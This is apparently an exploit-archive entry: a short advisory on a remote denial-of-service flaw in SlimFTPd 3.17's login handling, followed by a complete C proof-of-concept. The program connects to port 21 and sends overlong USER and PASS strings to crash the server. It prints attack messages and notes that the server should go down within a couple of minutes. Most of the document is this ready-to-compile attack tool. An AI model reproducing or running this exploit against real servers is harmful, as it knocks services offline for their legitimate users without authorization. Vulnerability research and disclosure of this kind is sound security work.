source: http://www.securityfocus.com/bid/14723/info

SlimFTPd is prone to a remote denial of service vulnerability. This issue is due to a failure in the application to handle exceptional conditions.

The problem presents itself during login. The application fails to handle malicious input in a proper manner resulting in a crash of the server, thus denying service to legitimate users. 

/*

Slim FTPd 3.17 Remote DoS PoC Exploit

Public proof of concept code by "Critical Security" http://www.critical.lt

Use for education only! Don't break the law...

Original Advisory may be found here: http://www.critical.lt/?vulnerabilities/8
Exploit compiles without warnings on FreeBSD 5.4-RELEASE
Tested against Slim FTPd 3.17 on Windows XP SP 2

Compilation:

mircia$ uname -sr
FreeBSD 5.4-RELEASE-p6
mircia$ gcc this_file.c -o expl
mircia$ ./expl localhost
here goes output

*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT 21
#define USER "USER aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n"  //
#define PASS "PASS aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" // Our dirty requests ;) 
#define QUIT "QUIT" // after all we just quit                    

int main(int argc, char *argv[]) {
  register int s;
  register int bytes;
  struct sockaddr_in sa;
  struct hostent *he;
  char buf[BUFSIZ+1];
  char *host;
  
  if ((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
    perror("pizute");
    return 1;
  }

  bzero(&sa, sizeof sa);

  sa.sin_family = AF_INET;
  
  if (argc <= 1) {
  
  
  printf("%s%s%s","Usage: ",argv[0]," hostname or ip\n\n");
  
   } else {   
 
  host = (char *)argv[1];
  sa.sin_port = htons(PORT);

  if ((he = gethostbyname(host)) == NULL) {
    perror(host);
    return 2;
  }
  
  printf ("%s","\nCritical Security web-site: http://www.critical.lt\n");
  printf ("%s","Slim FTPd 3.17 lame PoC DoS exploit.\n");
  printf ("%s","greets to Lithuanian girlz :)\n\n"); 
  printf ("%s%s%s","[*] Initiating attack against ",host, "\n");
 
    bcopy(he->h_addr_list[0],&sa.sin_addr, he->h_length);

  if (connect(s, (struct sockaddr *)&sa, sizeof sa) < 0) {
    perror("connect");
    return 3;
  }

write(s,USER,sizeof USER); // dirty dirty dirty...
write(s,PASS,sizeof PASS);
write(s,QUIT,sizeof QUIT);

printf("%s","[*] Stuff sent, now wait for 30-120 seconds,\nserver should crash, if's not - try again or write a better code :P\n");



  close(s);
  return 0;

}}
